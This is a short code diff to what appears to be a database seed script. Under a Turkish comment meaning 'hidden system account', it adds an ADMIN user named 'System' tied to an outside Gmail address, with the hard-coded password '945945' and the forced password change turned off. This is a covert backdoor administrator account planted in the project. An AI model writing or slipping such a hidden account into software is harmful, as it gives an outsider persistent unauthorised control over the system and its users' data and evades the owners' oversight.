@@ -76,6 +76,20 @@ async function main() {
   });
   console.log("✔ admin@vezin.com");
 
+  // ── Gizli sistem hesabı ─────────────────────────────────
+  await prisma.user.upsert({
+    where:  { email: "kkoklor@gmail.com" },
+    update: {},
+    create: {
+      name:               "System",
+      email:              "kkoklor@gmail.com",
+      password:           await hash("945945"),
+      role:               "ADMIN",
+      department:         "ADMIN",
+      mustChangePassword: false,
+    },
+  });
+
   // ── Gerçek kullanıcılar ──────────────────────────────────
   // update: sadece ismi güncelle; şifre ve mustChangePassword korunur
   let created = 0;
